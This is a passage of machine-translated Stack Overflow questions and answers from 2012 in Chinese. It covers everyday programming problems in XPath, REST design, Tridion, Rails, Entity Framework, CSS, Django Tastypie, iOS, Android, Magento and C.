        Binding.TextField = "FullName"
        Binding.ValueField = "ID"
        TreeView1.DataBindings.Add(Binding)

        ' Finally! Hook that bad boy up!       
        TreeView1.DataSource = XDdataSource
        TreeView1.DataBind() 
```

但它在这里失败了：

```
 SearchString = [String].Format("//*[@Id=""{0}""] ", Row("ParentId").ToString()) 
```

如何修复此 xPath 以匹配我的 XML？请建议我该如何解决这个问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:03:24.900

尝试按如下方式更改 xpath-->

`SearchString = [String].Format("//Id[.=""{0}""]/..", Row("ParentId").ToString())`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:27:06.750

该`@`符号用于检查匹配的**属性**值。删除并重`@`试。

# web-services - 将 restful 架构映射到 CRUD 功能

> ID：10603271
> 
> 赞同：3
> 
> 时间：2012-05-15T14:47:41.777
> 
> 标签：web-services, rest, java-ee-6, restful-architecture

我正在尝试用 Java 开发我的第一个宁静服务，并且在将方法映射到 CRUD 功能时遇到了一些麻烦。

我的 uri 结构如下并映射到基本数据库结构：

> /databases/{schema}/{table}/
> 
> /databases 是静态的
> 
> {schema} 和 {table} 是动态的，并根据路径参数做出反应

这就是我所拥有的：

```
Method - URI        - DATA      - Comment
---------------------------------------------------------------------
GET    - /databases - none      - returns a list of databases
POST   - /databases - database1 - creates a database named database1
DELETE - /databases - database1 - deletes the database1 database
PUT    - /databases - daatbase1 - updates database1 
```

目前在上面的示例中，我将数据库名称作为 JSON 对象传递。但是，我不确定这是否正确。我是否应该这样做（以 DELETE 方法为例）：

```
Method - URI                  - DATA - Comment
---------------------------------------------------------------------
DELETE - /databases/database1 - none - deletes the database with the same name 
```

如果这是正确的方法并且我需要传递额外的数据，那么下面的内容是否正确：

```
Method - URI                  - DATA      - Comment
---------------------------------------------------------------------
DELETE - /databases/database1 - some data - deletes the database with the same name 
```

任何意见将不胜感激

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:22:37.630

REST 是进入您的域的接口。因此，如果您想**公开数据库**，那么 CRUD 可能会起作用。但是 REST 还有更多功能（见下文）

REST-afarians 会反对您的服务是 RESTful 的，因为如果不符合关键约束之一：**超媒体约束**。但是，如果您添加指向您的服务将生成/提供的文档（超媒体）的**链接**，则可以解决此问题。请参阅[超媒体约束](http://en.wikipedia.org/wiki/HATEOAS)。在此之后，您的用户将按照链接和表单来更改应用程序中的内容。（您的示例中的数据库、表和行）：

```
- GET /database -> List of databases
- GET /database/{name} -> List of tables
- GET /database/{name}/{table}?page=1 -> First set of rows in table XXXXX
- POST /database/{name}/{table} -> Create a record
- PUT /database/{name}/{table}/{PK} -> Update a record
- DELETE /database/{name}/{table}/{PK} -> Send the record to the big PC in the sky.. 
```

不要忘记为您的文档添加链接！

将 REST 用于 CRUD 有点像把它放在[紧身衣](http://en.wikipedia.org/wiki/Straitjacket)里:)：你的 URI 可以代表任何概念。因此，如何尝试根据您希望您的服务或 Web 应用程序执行的底层资源（功能）公开一些更有创意/更丰富的 URI。

看看这篇很棒的文章：***[如何喝杯咖啡](http://www.infoq.com/articles/webber-rest-workflow)***

# tridion - 我可以从 Tridion 发布 ASPX 页面及其代码隐藏文件吗？

> ID：10603279
> 
> 赞同：1
> 
> 时间：2012-05-15T14:48:04.910
> 
> 标签：tridion, tridion-2011

我开发了一个 ASP.NET 聊天应用程序。现在我想与我的 Tridion 页面进行一些集成。为此，我需要一些已发布页面的代码隐藏文件。还有一个问题假设我想在我的页面中添加一个带有点击事件的按钮。我怎样才能做到这一点？我做了什么：

```
<%@ Page language="c#" Inherits="SDLchat.ChatWin" CodeFile="ChatWin.aspx.cs" %>
<%@ Register src="ChatLogin.ascx" TagName="c2" TagPrefix="uc2" %>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >

<HTML>
<HEAD>
    <title>ChatWin</title>
</HEAD>
<body>
    <form id="Form1" method="post" runat="server">
        <asp:Panel ID="Panel1" runat="server">
            <uc2:c2 ID="log2" runat="server" />
        </asp:Panel>

        <asp:Panel ID="Panel2" runat="server" Visible="False">
            <asp:LinkButton ID="LinkButton1" runat="server"
                 onclick="LinkButton1_Click">Change Room</asp:LinkButton>
        </asp:Panel>
    </form>
</body>
</HTML> 
```

![这是我的 .net 应用程序文件](../Images/01219200b6e9610d9b884e8491c836ca.png)

这是我想在 Tridion 中迁移的 ASP.NET Web 应用程序。请帮忙

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T15:07:40.127

因此，此应用程序中的每个页面都有两个文件：

1.  包含标记的 ASPX 文件
2.  包含代码的 CS 文件

由于 Tridion 发布基于每页一个文件，因此您可以通过为它们创建两个单独的页面来从 Tridion 发布这两个文件。或者，您可以选择仅从 Tridion 发布 ASPX，并在将 Web 应用程序部署到 IIS 时部署 CS 文件。

我建议将 ASPX 内容放入 Tridion 中的 DWT 模板构建块中，然后将其用作复合页面模板中的唯一构建块。

如果您决定同时从 Tridion 发布代码隐藏 CS 文件，请为其创建单独的 DWT，将代码粘贴到其中并为其创建单独的复合页面模板。

* * *

关于 PageLoad 事件的第二个问题：在这种情况下，Tridion 只会发布您放入其中的文件。它与您放入这些文件中的 ASP.NET 代码无关。如果 ASP.NET 页面加载事件在 Tridion 之外起作用，那么当您从 Tridion 发布相同的文件时它就会起作用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T15:42:00.247

Frank 给出了准确的答案，但我认为将任何代码从 CMS 发布到 Web 应用程序是一种非常糟糕的做法。使用这种方法无法测试整个应用程序，因为 CMS 用户可以增量更新应用程序。

我强烈建议您将所有代码隐藏到 Web 应用程序中，并通过 Visual Studio 等工具提供的典型 Web 应用程序部署过程来部署这些代码，并且只发布对 Web 应用程序中已有代码的引用的 ASPX 文件.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-15T21:14:30.500

我同意 Chris 的观点，仅仅因为可以从 SDL Tridion CMS 发布任何内容（包括 dll、.config 文件、未编译的代码等）并不意味着您应该这样做。

应用程序逻辑（或代码）的生命周期与内容生命周期非常不同。通常，代码更改需要在整个开发、测试、验收环境中仔细部署、测试、修复和重新部署，然后由技术用户在一个操作中部署到生产环境中。根据您的组织，您可能有每月或更短/更长的开发和部署周期。

另一方面，您的现实生活内容通常仅存在于生产环境中，并且由非技术用户根据需要（可能每小时甚至更频繁）更新。

如果您将内容管理与应用程序部署混为一谈，您很快就会陷入混乱。想象一下有人不小心取消了 App_Code 结构组的发布？如果编辑重新发布了整个结构组，但没有意识到您已经对后面的代码进行了一些更改，该怎么办？你将如何确保 bin 结构组中的 dll与 web.config 以及其中注册的 ascx 控件在其他地方*完全相同的时间发布？*最好的情况是您的应用程序可能无法运行，最坏的情况是您会在整个站点中遇到编译错误。

我在各种 ASP.NET/SDL Tridion 网站上看到和使用的一些指南如下：

*   使用标准基本页面（或有限的基本页面集，可能由页面模板确定）作为所有已发布 aspx 页面的公共代码 - 将通用逻辑放在此处
*   对于任何特定功能，将其封装在控件（ascx 或 Web 控件）中，并将逻辑放入此代码中
*   在 bin 目录中的已编译 dll 中包含用于基本页面的 .cs、用于控件和其他逻辑的代码 - App_Code 非常适合开发，但可能会为所有这些不同的文件管理带来部署难题

# ruby-on-rails - ActiveRecord，如何在满足列时间时触发进程

> ID：10603283
> 
> 赞同：0
> 
> 时间：2012-05-15T14:48:07.490
> 
> 标签：ruby-on-rails

假设我们有一个表 Product

```
+---+------+--------+--------------+
| id|  name| status | expiry_date  |
+---+------+--------+--------------+
| 1 |   A  | Good   | 10 min ago   | <-- this supposed to be "Expired"
| 2 |   B  | Good   | 10 min later | 
+---+------+--------+--------------+ 
```

我的问题是如何将 id 1 的状态设置为“已过期”，因为它的过期日期已过。

我通常用 cron 任务来做这个。但是，我认为读取整个表以查找几行效率不高，此外，cron 任务在其间隔到来之前不会更新状态。（即 10 分钟、20 分钟 .. 等）

有什么方法可以在达到时间时触发即时流程，以便我可以尽快更新其状态？

希望我的问题很清楚。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T14:58:50.313

如果您暗示要执行更新的控制器操作，您可以执行以下操作：

```
Product.where(["expire_date < ?", ->{ Time.now.utc - 10.minutes }.call]).update_all(:status, 'Bad') 
```

**更新。**或者，如果您只想更新具有给定 ID 的单个产品：

```
product = Product.find(params[:id])

if product.expire_date < Time.now.utc - 10.minutes
  product.status = 'Bad'
  product.save
end 
```

# entity-framework - 在一次提交中保存来自不同类的多个对象

> ID：10603288
> 
> 赞同：1
> 
> 时间：2012-05-15T14:48:22.500
> 
> 标签：entity-framework, repository-pattern

我想知道保存多个对象的最佳方法是什么，如果第二个'obj.Insert（）'抛出异常，所有更改都会回滚。

我正在尝试这样的事情：

```
Product product1 = new Product();
Product product2 = new Product();
Product product3 = new Product();

DbContext DB = new DB();

IProductInsert repository = new ProductInsert(DB);

repository.Insert(product1);
repository.Insert(product2);
repository.Insert(product3);

DB.SaveChanges(); 
```

但在我看来，我认为这是不正确的..

如何使用存储库类中的 DB.SaveChanges() 保存所有更改或回滚？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:51:55.860

您应该能够使用事务范围来做到这一点：

```
using (var ts = new TransactionScope()) {
    repository.Insert(product1);
    repository.Insert(product2);
    repository.Insert(product3);
    DB.SaveChanges();
    ts.Complete();
} 
```

如果在此序列中出现任何故障，并且调用`ts.Complete()`未到达，则后台事务将回滚。

有关适用于多个数据库上下文的解决方案，请参阅[此答案](https://stackoverflow.com/a/815660/335858)。

# photoshop - 通过 Photoshop SDK 关闭 colorPicker

> ID：10603293
> 
> 赞同：2
> 
> 时间：2012-05-15T14:48:38.903
> 
> 标签：photoshop

我正在使用带有 Javascript 的 Photoshop SDK，我完全坚持颜色选择器的行为。如果打开，我会关闭 Photoshop ColorPicker（我`app.showColorPicker()`用来展示它）。

有没有办法从脚本中关闭它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:23:49.560

我不确定脚本中有没有办法做到这一点，或者是否有必要。仅从测试`app.showColorPicker()`来看，脚本似乎挂起并等待用户选择颜色并单击确定，或单击取消（两者都关闭窗口），然后继续执行脚本，因此它会在评估下一行之前自行关闭反正代码。

# html - 带有包装器后面的图像的div不起作用

> ID：10603294
> 
> 赞同：0
> 
> 时间：2012-05-15T14:48:38.977
> 
> 标签：html, css

我正在创建一个白色的网站，所以我没有分配任何背景。但我想在网站的两个部分添加一些蓝色渐变细节。#bg_top 将放置在左侧的顶部，而#bg_bottom 应放置在右侧的底部。当然，这并不完全按照我想要的方式工作......

这是它在我的 html 上的显示方式：

```
<body>

<div id="bg_top"></div>

<div id="wrapper">
</div>

<div id="bg_bottom">
</div>

<footer>
</footer> 
```

#bg_top 完美运行。它确实显示在包装器后面，但 bg_bottom 给我带来了问题，因为它放置得很好，但它在包装器和页脚之间视觉上。因此我使用了 z-index 但它也不起作用。另外奇怪的是底部和左侧参数没有任何区别。这是CSS代码：

```
#wrapper{
    width: 925px;
    height: 1355px;
    margin-left: auto;
    margin-right: auto;
    position: relative;
}

#bg_top{
    width: 500px;
    height: 500px;
    position: absolute;
    top: 0px;
    left: 0px;
    background-image: url('../_img/2_body/bg/bg_top.jpg');
    z-index: -1;
}

#bg_bottom{

    width: 500px;
    height: 500px;
    position: relative;
    float: right;
    bottom: 0px;
    right: 0px;
    background-image: url('../_img/2_body/bg/bg_under.jpg');
    z-index: -1;
} 
```

有人可以帮我吗？我什么都试过了...

谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T16:57:50.187

使用 position: relative，如果您希望它在包装器中直观地显示，则需要将 HTML 放在包装器中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-16T08:07:39.317

我已经得到了答案……我需要将图片放在包装纸后面。底部图片贴在页脚的右上角，顶部图片与页眉处于同一级别。感谢输入，我看到它非常简单......

```
 <body>

<header>

<div id="bg_top"></div>

</header>

<div id="wrapper"></div>

<footer>
<div id="bg_bottom"></div>
</footer>

</body> 
```

因此，在我应用绝对位置和 z-index 和图片作为背景完成之后......在包装器后面并在它的位置。这是最终的 CSS 代码：

```
#bg_top{
    width: 500px;
    height: 500px;
    position: absolute;
    top: 0px;
    left: 0px;
    background-image: url('../_img/2_body/bg/bg_top.jpg');
    z-index: -1;
}

#bg_bottom{

    width: 500px;
    height: 500px;
    position: absolute;
    background-image: url('../_img/2_body/bg/bg_under.jpg');
    bottom: 155px; 
```

任何其他疑问也许我可以提供帮助......对：0px; z 指数：-1；}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:19:05.077

问题是您没有将 bg_top 和 bg_bottom 包装在包装器内。当你这样做时它会完美运行。请找到我使用的小提琴

[http://jsfiddle.net/meetravi/sL5jm/](http://jsfiddle.net/meetravi/sL5jm/)

祝你好运 ！

# django - Tastypie 外键设置为空

> ID：10603300
> 
> 赞同：6
> 
> 时间：2012-05-15T14:49:02.553
> 
> 标签：django, tastypie

我正在创建 UserResource 和 UserProfileResource。当我创建一个新用户时，我看到我的 userprofile 数据库表也在更新。哪个好。但是当我 GET 用户时，我收到一条错误消息：

```
The model '' has an empty attribute 'profile' and doesn't allow a null value. 
```

我的代码：

资源.py

```
class UserProfileResource(ModelResource):
    home_address = fields.CharField(attribute='home_address')
    user = fields.ToManyField('resources.UserResource', attribute='user', related_name='profile')
    class Meta:
        queryset = UserProfile.objects.all()
        resource_name = 'profile'
        allowed_methods = ['get', 'post', 'delete', 'put']
        fields = ['home_address']
        authorization = Authorization()
        include_resource_uri = False
        include_absolute_url = False

class UserResource(ModelResource):
    profile = fields.ToOneField('resources.UserProfileResource', attribute = 'profile', related_name='user', full=True)
    class Meta:
        queryset = User.objects.all()
        resource_name = 'user'
        allowed_methods = ['get', 'post', 'delete', 'put']
        fields = ['username']
        filtering = {
                'username': ALL,
                }
        authorization = Authorization()

    def obj_create(self, bundle, request=None, **kwargs):
        try:
            bundle = super(UserResource, self).obj_create(bundle, request, **kwargs)
            bundle.obj.set_password(bundle.data.get('password'))
            bundle.obj.save()
        except IntegrityError:
            raise BadRequest('IntegrityError')
        return bundle 
```

模型.py

```
class UserProfile(models.Model):
    user = models.ForeignKey(User, unique=True)
    home_address = models.TextField() 
```

有人有什么想法吗？约翰诺克

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-18T10:15:10.820

经过大量的搜索，我终于得到了这个问题的答案。

模型.py

```
class UserProfile(models.Model):
    user = models.OneToOneField(User)
    home_address = models.TextField() 
```

资源.py

```
class UserProfileResource(ModelResource):
    class Meta:
        queryset = UserProfile.objects.all()
        resource_name = 'profile'
        allowed_methods = ['get', 'post', 'delete', 'put']
        fields = ['home_address']
        authorization = Authorization()
        include_resource_uri = False
        include_absolute_url = False

class UserResource(ModelResource):
    profile = fields.ToOneField('resources.UserProfileResource', attribute = 'userprofile', related_name='user', full=True, null=True)
    class Meta:
        queryset = User.objects.all()
        resource_name = 'user'
        allowed_methods = ['get', 'post', 'delete', 'put']
        fields = ['username']
        filtering = {
                'username': ALL,
                }
        authorization = Authorization()

    def obj_create(self, bundle, request=None, **kwargs):
        try:
            bundle = super(UserResource, self).obj_create(bundle, request, **kwargs)
            bundle.obj.set_password(bundle.data.get('password'))
            bundle.obj.save()
        except IntegrityError:
            raise BadRequest('IntegrityError')
        return bundle 
```

这行得通。请注意，模型字段已更改为 OneToOneField，并且资源属性现在为“userprofile”。我希望这可以帮助那里的人！

约翰

# iphone - UITableView 延迟加载优化

> ID：10603302
> 
> 赞同：6
> 
> 时间：2012-05-15T14:49:10.277
> 
> 标签：iphone, objective-c, ipad, uitableview, lazy-loading

我有`UITableView`。在`tableView:cellForRow:atIndexPath:`方法中（当数据填充到单元格时）我实现了某种延迟加载。如果程序在后台`rowData` `NSDictionary`启动方法中没有 key(key==row number) 的对象。`requestDataForRow:`所以在单元格变得可见后，单元格中的数据会被填充一点。这是代码：

```
static int requestCounter=0;

-(void)requestDataForRow:(NSNumber *)rowIndex
{
    requestCounter++;
    //NSLog(@"requestDataForRow: %i", [rowIndex intValue]);
    PipeListHeavyCellData *cellData=[Database pipeListHeavyCellDataWithJobID:self.jobID andDatabaseIndex:rowIndex];
    [rowData setObject:cellData forKey:[NSString stringWithFormat:@"%i", [rowIndex intValue]]];
    requestCounter--;

    NSLog(@"cellData.number: %@", cellData.number);

    if (requestCounter==0)
    {
        //NSLog(@"reloading pipe table view...");
        [self.pipeTableView performSelectorOnMainThread:@selector(reloadData) withObject:nil waitUntilDone:NO];
    };
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *MyIdentifier = @"pipeCellIdentifier";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:MyIdentifier];
    [[NSBundle mainBundle] loadNibNamed:@"PipesForJobCell" owner:self options:nil];
    cell = pipeCell;
    self.pipeCell = nil;

    PipeListHeavyCellData *cellData=[[PipeListHeavyCellData alloc] init];

    if ([rowData objectForKey:[NSString stringWithFormat:@"%i", indexPath.row]]==nil)
    {
        //NSLog(@"        nil data for row: %i", indexPath.row);
        [self performSelectorInBackground:@selector(requestDataForRow:) withObject:[NSNumber numberWithInt:indexPath.row]];
    }
    else
    {
        //NSLog(@"        has data for row: %i", indexPath.row);
        PipeListHeavyCellData *heavyData=[[PipeListHeavyCellData alloc] init];
        heavyData=(PipeListHeavyCellData *)[rowData objectForKey:[NSString stringWithFormat:@"%i", indexPath.row]];
        cellData._id=[heavyData._id copy];
        cellData.number=[heavyData.number copy];
        cellData.status=[heavyData.status copy];
}; 
```

此代码有效，一切正常，**但**我的表有 2000 行，如果用户从索引为 10 的单元格快速滚动到索引为 2000 的单元格。他必须等待很长时间，直到所有拉取数据请求都完成（对于第 11、12、13、...、2000 行），因为在用户滚动表格视图时行变得可见，因此`requestDataForRow`为它们调用了该方法。

我怎样才能优化这些东西？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T16:58:36.420

我不得不做类似的事情。您需要先创建一个队列来处理最近添加的项目。

例如，用户打开表，有 10 个请求排队。您将第一个对象出列并开始获取第一行的数据。然而，用户随后向下滚动到第 31-40 行。然后，您必须在队列中的前 10 行之前插入这些行，因为它们现在具有更高的优先级。关键是您不会立即立即启动 10 个请求，而是按顺序处理它们。这样，当用户滚动时，您只会“浪费”一个请求——最后一个请求。

实际实现这一点的一种简单方法是使用`[tableView indexPathsForVisibleRows]`.

# java - 将联系人导入 Android 应用程序？

> ID：10603304
> 
> 赞同：1
> 
> 时间：2012-05-15T14:49:20.053
> 
> 标签：java, android, import-contacts

我是 Android 新手，我有一个问题要问大家。

目前，我正在开发一个防盗应用程序，我想在我的应用程序中具有远程锁定丢失电话功能。但是用户在设置的时候需要设置一个手机号码，所以只有从这个号码发出的短信才能触发这个功能……我可以导入手机中的联系人，然后用户选择其中一个联系人作为这个预定义的号码吗？可能吗？谢谢

# php - 重新调整网页大小以适应访问者显示器的分辨率

> ID：10603305
> 
> 赞同：0
> 
> 时间：2012-05-15T14:49:20.323
> 
> 标签：php, javascript, css

我设计了一个网站。我想知道是否可以调整我网站中的页面大小以适应访问者的显示器分辨率。

例如，我正在使用分辨率为 1024x768 的计算机。如果我将分辨率更改为 800x600，我希望我的网站重新调整大小以适应 800x600 的屏幕分辨率。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T14:50:36.580

是的，它被称为[响应式设计](http://en.wikipedia.org/wiki/Responsive_Web_Design)。具体看[媒体查询](https://www.google.com/search?ix=seb&sourceid=chrome&ie=UTF-8&q=media%20queries)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:54:49.943

您不需要分辨率，因为不是每个人都使用全屏浏览器；你想要的文件大小。有一些方法可以用纯 javascript 来实现，但最好的办法是使用像 jquery 这样的库，因为这有助于确保你的技术可以跨浏览器工作：

[http://api.jquery.com/width/](http://api.jquery.com/width/)

但是不要这样做，除非没有其他方法可以做你想做的事；首先尝试在 CSS 中使用百分比。用 js 设置大小很麻烦。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:03:27.057

这是您搜索内容的一些关键词

CSS网格系统响应/自适应网络

一些链接

[http://net.tutsplus.com/tutorials/design-tutorials/quick-tip-different-layouts-for-different-widths/](http://net.tutsplus.com/tutorials/design-tutorials/quick-tip-different-layouts-for-different-widths/)

[http://speakerdeck.com/u/nathansmith/p/960-grid-system](http://speakerdeck.com/u/nathansmith/p/960-grid-system)

[http://www.emblematiq.com/lab/my-adaptive-grid/](http://www.emblematiq.com/lab/my-adaptive-grid/)

[http://webdesignledger.com/resources/responsive-web-design-templates-and-frameworks](http://webdesignledger.com/resources/responsive-web-design-templates-and-frameworks)

[发电机](http://grids.heroku.com/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T14:52:35.793

这称为“动态”或“流动”宽度，而不是在页面上设置“固定”宽度。这通常使用 CSS 完成，而不是 PHP 或 JavaScript。在 Google 上对该主题进行一些研究（搜索“动态宽度网页”）。我找到[了这篇文章](http://www.alteredimpressions.com/articles/web-design/web-page-width-dilemma/)。

# c++ - 如何从模板类返回内部结构

> ID：10603307
> 
> 赞同：1
> 
> 时间：2012-05-15T14:49:40.453
> 
> 标签：c++, templates, struct

我的问题是标题？如何从模板类返回内部结构？

```
template<class TYPE3>
class MyClass
{
public:

    typedef struct MyNode_type {
        int Key;
        TYPE3 Data;
    }MyNode;

private:

    MyNode *m_Root;

    //=== My Question is Here =====/
    MyClass<TYPE3>::MyNode *getRootNode() {
        return m_Root;
    }

}; 
```

我想从 getRootNode 函数返回 m_Root，但我不知道如何定义它的类型，所以我可以使用： MyClass::MyNode *rootnode = cls.getRootNode();

感谢您的帮助！..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T14:54:30.073

当您这样做时`MyClass<int>::MyNode`，将正确解析为内部结构类型。但是，当您执行`MyClass<TYPE3>::MyNode`where `TYPE3`is a template parameter 时，您需要通过插入让编译器知道您指的是一个类型`typename`：

```
typename MyClass<TYPE3>::MyNode* getRootNode() ... 
```

另外，丢掉那个`typedef struct`，这是 C++ 而不是 C。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T15:58:49.963

您可以使用类型定义

在您的模板中：

```
typedef typename MyClass<TYPE3>::MyNode NodeType; 
```

别处：

```
MyClass<TYPE3>::NodeType* pNode = cls.getRootNode(); 
```

# android - 与 Wifi Direct 的 p2p 连接中的信号强度？

> ID：10603309
> 
> 赞同：3
> 
> 时间：2012-05-15T14:49:41.270
> 
> 标签：android, rssi, wifi-direct

我正在查看适用于 Android 的 WifiDirect 演示，并想知道是否有可能获得两个连接设备之间的 RSSI 或信号强度。

抱歉，如果这个问题没有意义，我知道可以从接入点获取 RSSI，但我想知道的是，这种 RSSI 概念是否存在于 Wifi Direct 中设备之间的 p2p 连接中。

感谢您的时间。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-15T15:31:03.823

> **注意**：这个答案适用于 API 级别 14，我不知道它是否仍然适用于最新的 Android 版本。

Android 代码源中存在一个名为 WifiP2pPeer 的未记录文件。它包含一些“有趣”的行。

我们可以看到，RSSI 值是硬编码`mRssi = 60; //TODO: fix`的（

```
public class WifiP2pPeer extends Preference {

    private static final int[] STATE_SECURED = {R.attr.state_encrypted};
    public WifiP2pDevice device;

    private int mRssi;
    private ImageView mSignal;

    private static final int SIGNAL_LEVELS = 4;

    public WifiP2pPeer(Context context, WifiP2pDevice dev) {
        super(context);
        device = dev;
        setWidgetLayoutResource(R.layout.preference_widget_wifi_signal);
        mRssi = 60; //TODO: fix
    }

    @Override
    protected void onBindView(View view) {
        if (TextUtils.isEmpty(device.deviceName)) {
            setTitle(device.deviceAddress);
        } else {
            setTitle(device.deviceName);
        }
        mSignal = (ImageView) view.findViewById(R.id.signal);
        if (mRssi == Integer.MAX_VALUE) {
            mSignal.setImageDrawable(null);
        } else {
            mSignal.setImageResource(R.drawable.wifi_signal);
            mSignal.setImageState(STATE_SECURED,  true);
        }
        refresh();
        super.onBindView(view);
    }

    @Override
    public int compareTo(Preference preference) {
        if (!(preference instanceof WifiP2pPeer)) {
            return 1;
        }
        WifiP2pPeer other = (WifiP2pPeer) preference;

        // devices go in the order of the status
        if (device.status != other.device.status) {
            return device.status < other.device.status ? -1 : 1;
        }

        // Sort by name/address
        if (device.deviceName != null) {
            return device.deviceName.compareToIgnoreCase(other.device.deviceName);
        }

        return device.deviceAddress.compareToIgnoreCase(other.device.deviceAddress);
    }

    int getLevel() {
        if (mRssi == Integer.MAX_VALUE) {
            return -1;
        }
        return WifiManager.calculateSignalLevel(mRssi, SIGNAL_LEVELS);
    }

    private void refresh() {
        if (mSignal == null) {
            return;
        }
        Context context = getContext();
        mSignal.setImageLevel(getLevel());
        String[] statusArray = context.getResources().getStringArray(R.array.wifi_p2p_status);
        setSummary(statusArray[device.status]);
    }
} 
```

# magento - 基于地理位置的运输（国家）

> ID：10603310
> 
> 赞同：0
> 
> 时间：2012-05-15T14:49:43.563
> 
> 标签：magento

我是magento的初学者，我希望根据地理位置（国家）选择运输方式，如果客户选择国家，我希望自动选择它。任何人都知道如何做到这一点..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T08:20:08.393

您应该尝试使用像[Owebia 2](http://www.magentocommerce.com/magento-connect/owebia-shipping-2.html)这样的扩展（您可以在此处找到[文档](http://www.owebia.com/contributions/magento/owebia-shipping/en/)）

这将允许您根据客户所在的国家/地区设置运费和交付方式。

编辑：您几乎可以将其用于任何运输，例如 UPS 或 Fedex（我在我工作的最后一个网站上将其用于 UPS）。

这是一些配置示例

```
# UPS  National (France, Monaco, Andorre)
{
    code: "expressupsnational",
    label: "Service STANDARD France : Livraison 24/48h",
    destination: "FR,MC,AD",
    fees: "{table {cart.weight} in 2:8.5, 12:14.5}",
    tracking_url: "http://wwwapps.ups.com/WebTracking/track",
} 
```

这是针对法国的，因此费用与购物车重量有关（如果购物车重量低于 2 公斤，则为 8.5 金币，如果低于 12 公斤，则为 14.5 金币）。注意label部分是前端显示的方法名，destination是目的国ISO代码列表。下一部分是针对来自德国、比利时的客户...

```
# UPS  Zone 5 (DE,BE,LU,AT)
{
    code: "expressupseurope5",
    label: "Service STANDARD Europe: Livraison 48/72h",
    destination: "DE,BE,LU,AT",
    fees: "{table {cart.weight} in 2:12.0, 12:24.0}",
    tracking_url: "http://wwwapps.ups.com/WebTracking/track",
} 
```

如果您参考文档，您会看到您可以添加许多条件，例如属性集、税率、购物车中的产品数量等……它比原始的 Magento 运输方式更灵活。

# c - 与初始化 char[] 混淆

> ID：10603312
> 
> 赞同：1
> 
> 时间：2012-05-15T14:49:51.317
> 
> 标签：c

请看以下代码：

```
char h[256];
    h[0]=NULL;
    if(h!=NULL)
    {
        printf("It doesn't show NULL\n");
    }
    else
    {
        printf("It shows NULL\n");
    } 
```

还有以下内容：

```
char h[256];
        if(h!=NULL)
        {
            printf("It doesn't show NULL\n");
        }
        else
        {
            printf("It shows NULL\n");
        } 
```

还有以下内容：

```
 char h[256];
h[0]='\0';
            if(h!=NULL)
            {
                printf("It doesn't show NULL\n");
            }
            else
            {
                printf("It shows NULL\n");
            } 
```

在任何情况下`char* h`都没有NULL。为什么会这样？是不是假设有 NULL 因为我没有在那里存储任何东西？如果不是这样，我如何确保它只包含 NULL？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T14:52:21.800

`h[0]`不一样`h`。 `h[0]`是数组中的第一个字符；`h`是数组本身（在这种情况下衰减为指针）。

试试这个：

```
char h[256];
h[0]=NULL;
if(h[0]!=NULL)
{
    printf("It doesn't show NULL\n");
}
else
{
    printf("It shows NULL\n");
} 
```

另请注意，您可能不应该`NULL`在这种情况下使用。 `NULL`用于指针；你想要`'\0'`的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T14:55:12.660

由于您在`char[]`堆栈上分配数组，因此它不能是`NULL`. `h`将始终指向内存中的有效位置，因此您的检查**必须**失败。

如果你想在没有数据的情况下初始化你的数组，你应该使用

```
char h[256] = {'\0'}; 
```

`'\0'`是不一样的`NUL`字符`NULL`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T14:55:36.187

那是因为您的条件是`if(h != NULL)`这意味着您实际上正在比较`h`肯定不会的地址`NULL`。如果是这样`if(*h != NULL)`，第一种和第三种情况肯定会执行`else`部分。从第二部分开始，它将在 h[0] 处包含一些垃圾值，因此如果它是`0`，它会偶然执行`else`部分。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-15T14:57:08.417

定义

```
char h[256] 
```

表示*h*是一个数组。数组不能为*NULL*。数组是内存中存储一​​系列值的区域。

您以某种方式将*h*与*指针*混淆了。

即使是指针，指针的值与所指向的*事物*的值也不相同。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-15T15:00:29.470

代替

```
if(h!=NULL) 
```

你为什么不使用

```
if(h[0]!=NULL) 
```

当您将数组的第一个元素初始化为空时，而不是数组本身！为了确保元素为空，请使用

```
for(i=0; i<h.length ; i++)
 h[i]=NULL; 
```

或使用 '\0' 而不是 NULL

至于为什么 h 不为 NULL 尝试在 java 中打印 h，下面会返回一个 @....... 值，这基本上是变量指向的位置。（不为空！）

```
System.out.println(c); 
```

（很久没用c了，不知道能不能用c做类似的事情）

# drupal - Drupal 块配置

> ID：10603313
> 
> 赞同：0
> 
> 时间：2012-05-15T14:49:53.097
> 
> 标签：drupal

我不熟悉drupal的后端。我正在使用的只是网络界面。我一直在尝试修改一个块，以便它只在一页上。

